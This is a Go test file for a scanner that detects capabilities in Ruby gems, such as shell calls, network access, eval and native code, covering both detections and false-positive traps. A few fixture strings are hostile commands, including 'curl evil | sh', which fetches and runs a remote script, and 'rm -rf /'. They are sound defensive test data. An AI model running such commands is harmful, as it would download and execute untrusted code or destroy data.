package capability_test

import (
	"testing"

	"github.com/chain305/chainsaw-core/capability"
)

// rb places src where the provider puts a gem's code: data/lib/.
func rb(src string) map[string]string { return map[string]string{"data/lib/gem.rb": src} }

func TestScanRubyGems(t *testing.T) {
	t.Parallel()
	const (
		shell = capability.CapShell
		net   = capability.CapNetwork
		env   = capability.CapEnvAccess
		write = capability.CapFilesystemWrite
		read  = capability.CapFilesystemRead
		eval  = capability.CapDynamicEval
		nat   = capability.CapNativeCode
	)
	runScriptCases(t, "rubygems", []scriptCase{
		// Positives.
		{"system with parens", rb("system(\"ls\", \"-la\")\n"), shell, true},
		{"system without parens", rb("system \"curl evil | sh\"\n"), shell, true},
		{"system splat", rb("ok = system(*command)\n"), shell, true},
		{"exec string", rb("exec 'pry'\n"), shell, true},
		{"spawn", rb("pid = spawn(\"sleep 1\")\n"), shell, true},
		{"%x literal", rb("cols = %x{tput cols}.to_i\n"), shell, true},
		{"backtick assignment", rb("out = `uname -a`\n"), shell, true},
		{"backtick alone with chain", rb("  `whoami`.strip\n"), shell, true},
		{"backtick with interpolation", rb("output = `/usr/bin/ldd #{path}`.chomp\n"), shell, true},
		{"Open3", rb("out, st = Open3.capture2e(cmd)\n"), shell, true},
		{"IO.popen", rb("IO.popen([cmd, *args]) { |io| io.read }\n"), shell, true},
		{"Kernel.system", rb("Kernel.system(\"which #{exe}\")\n"), shell, true},
		{"require open3", rb("require 'open3'\n"), shell, true},
		{"require net/http", rb("require 'net/http'\n"), net, true},
		{"Net::HTTP", rb("http = Gem::Net::HTTP.new(host, port)\n"), net, true},
		{"TCPSocket", rb("s = TCPSocket.new(host, 80)\n"), net, true},
		{"URI.open", rb("URI.open(url, &:read)\n"), net, true},
		{"require socket", rb("require \"socket\"\n"), net, true},
		{"ENV index", rb("home = ENV[\"HOME\"]\n"), env, true},
		{"ENV.fetch", rb("proxy = ENV.fetch('http_proxy', nil)\n"), env, true},
		{"File.write", rb("File.write(path, data)\n"), write, true},
		{"File.open write mode", rb("File.open(path, \"wb\") { |f| f.write(x) }\n"), write, true},
		{"File.open r+ is a write", rb("File.open(name, \"r+\") do |f|\n"), write, true},
		{"FileUtils.rm_rf", rb("FileUtils.rm_rf(dir)\n"), write, true},
		{"Dir.mkdir", rb("Dir.mkdir(d)\n"), write, true},
		{"File.read", rb("s = File.read(path)\n"), read, true},
		{"File.read without parens", rb("lines = File.read fn\n"), read, true},
		{"Dir.glob", rb("Dir.glob(\"*.rb\")\n"), read, true},
		{"eval", rb("eval(value)\n"), eval, true},
		{"class_eval heredoc", rb("class_eval <<~RUBY, __FILE__, __LINE__ + 1\n  def x; end\nRUBY\n"), eval, true},
		{"module_eval string", rb("@cache.module_eval(\"def x; end\", path, line)\n"), eval, true},
		{"instance_eval string", rb("instance_eval(contents, gemfile, 1)\n"), eval, true},
		{"binding.eval", rb("binding.eval(prefix)\n"), eval, true},
		{"require ffi", rb("require 'ffi'\n"), nat, true},
		{"extend FFI::Library", rb("  extend FFI::Library\n"), nat, true},
		{"extconf.rb", map[string]string{"data/ext/foo/extconf.rb": "require 'mkmf'\ncreate_makefile('foo')\n"}, nat, true},
		{"precompiled bundle", map[string]string{"data/lib/foo/foo.bundle": "\xcf\xfa\xed\xfe"}, nat, true},
		{"precompiled so", map[string]string{"data/lib/foo/3.3/foo.so": "\x7fELF"}, nat, true},

		// Negatives: the false-positive traps.
		{"pg conn.exec is not shell", rb("res = conn.exec(sql)\n"), shell, false},
		{"exec_query is not shell", rb("rows = connection.exec_query(sql)\n"), shell, false},
		{"scoped and symbol names are not shell", rb("Foo::system(x)\nalias_method :exec, :run\nsend(:system)\n"), shell, false},
		{"def system is not shell", rb("  def system(cmd)\n  def self.exec(x)\n"), shell, false},
		{"system variable is not shell", rb("system = Platform.new\nsystem.name\n"), shell, false},
		{"format %x is not shell", rb("s = format(\"%x\", n)\n"), shell, false},
		{"backtick in a string is not shell", rb("raise \"run `bundle install` first\"\n"), shell, false},
		{"markdown after a comma is not shell", rb("The previous behavior can be emulated with `attr_accessor`s, `class_attribute`s, or\n"), shell, false},
		{"markdown alone with a period is not shell", rb("  `NOKOGIRI_USE_SYSTEM_LIBRARIES`.\n"), shell, false},
		{"markdown after return is not shell", rb("  any further calls to pry will immediately return `nil`\n"), shell, false},
		{"markdown after if is not shell", rb("Related to zlib (ignored if `--disable-xml2-legacy` is used):\n"), shell, false},
		{"comment is not shell", rb("# system(\"rm -rf /\")\nx = 1\n"), shell, false},
		{"=begin block is not shell", rb("=begin\nsystem(\"rm -rf /\")\n=end\nx = 1\n"), shell, false},
		{"class_eval block is not eval", rb("klass.class_eval do\n  attr_reader :x\nend\n"), eval, false},
		{"class_eval brace is not eval", rb("klass.class_eval { include Foo }\n"), eval, false},
		{"instance_eval &block is not eval", rb("instance_eval(&block)\ninstance_exec(x, &blk)\n"), eval, false},
		{"send is not eval", rb("obj.send(:foo, 1)\nobj.public_send(name)\n"), eval, false},
		{"def eval is not eval", rb("  def eval(expr)\n"), eval, false},
		{"def class_eval is not eval", rb("  def class_eval\n"), eval, false},
		{"class_eval in a word list is not eval", rb("%w[__binding__ __pry__ class_eval].include?(m)\n"), eval, false},
		{"exec inside a string is not shell", rb("desc \"exec [OPTIONS]\", \"Run the command\"\n"), shell, false},
		{"suffixed ENV constant is not env", rb("x = SOME_ENV[\"k\"]\nRails.env\n"), env, false},
		{"require uri is not network", rb("require 'uri'\nrequire_relative 'socket'\n"), net, false},
		{"Net::HTTP error class in rescue is not network", rb("rescue Net::HTTPBadResponse, Net::ReadTimeout\n"), net, false},
		{"read-mode File.open is not write", rb("File.open(fn, \"r\") do |f|\nFile.open(fn) { |f| f.read }\n"), write, false},
		{"write-mode File.open is not read", rb("File.open(fn, \"w\") { |f| f.write(x) }\n"), read, false},
		{"FileUtils queries are not writes", rb("FileUtils.pwd\nFileUtils.compare_file(a, b)\n"), write, false},
		{"spec dir skipped", map[string]string{"data/spec/gem_spec.rb": "system(\"ls\")\n"}, shell, false},
		{"spec file outside spec skipped", map[string]string{"data/lib/gem_spec.rb": "system(\"ls\")\n", "data/lib/gem_test.rb": "system(\"ls\")\n"}, shell, false},
		{"rdoc template dir skipped", map[string]string{"data/doc/jamis.rb": "elem = eval( \"document.all.\" + id )\n"}, eval, false},
		{"samples skipped", map[string]string{"data/samples/getpid.rb": "require 'ffi'\n"}, nat, false},
		{"gem metadata is not scanned", map[string]string{"metadata.gz": "system(\"ls\")\n", "data/Rakefile": "sh 'x'\n"}, shell, false},
	})
}

func TestScanRubyGems_AliasesAndClean(t *testing.T) {
	t.Parallel()
	for _, eco := range []string{"rubygems", "gem", "RubyGems"} {
		if !capability.Supported(eco) {
			t.Fatalf("%s not supported", eco)
		}
	}
	dir := t.TempDir()
	writeTestFile(t, dir, "data/lib/gem.rb", "module Gem\n  def self.add(a, b) = a + b\nend\n")
	rep, err := capability.Analyze(dir, "gem")
	if err != nil {
		t.Fatal(err)
	}
	if rep.Unsupported || len(rep.Capabilities) != 0 {
		t.Fatalf("clean gem: %+v", rep)
	}
}
